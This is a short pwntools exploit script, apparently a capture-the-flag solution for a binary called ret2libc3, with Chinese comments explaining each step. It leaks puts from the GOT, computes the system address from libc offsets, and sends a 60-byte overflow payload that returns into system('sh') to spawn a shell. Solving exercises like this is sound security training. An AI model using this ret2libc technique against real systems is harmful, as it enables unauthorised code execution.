from pwn import *
#因为本题没有system地址以及/bin/sh地址，所以这些都是我们需要录入的
#阅读程序我们可以得到libc中put的虚拟地址，分析libc文件，得出put和system在libc中的偏移量
elf = ELF('./ret2libc3')
libc = ELF('./libc.so.6')
pianyi = libc.symbols["system"]-libc.symbols["puts"]
io = process('./ret2libc3')
put_got = 0x804a01c
io.recv()
io.sendline(str(put_got))
io.recvuntil(b' : ')
put_libc = int(io.recvuntil(b'\n',drop = True),16)
over_flow = 60 #0x38+4,这里要在strcpy之后再查看溢出值，因为溢出漏洞在strcpy之后
system_addr=pianyi+put_libc
payload = cyclic(60)+p32(system_addr)+p32(0xdeedbeef)+p32(next(elf.search(b'sh\x00')))
io.sendline(payload)
io.interactive()
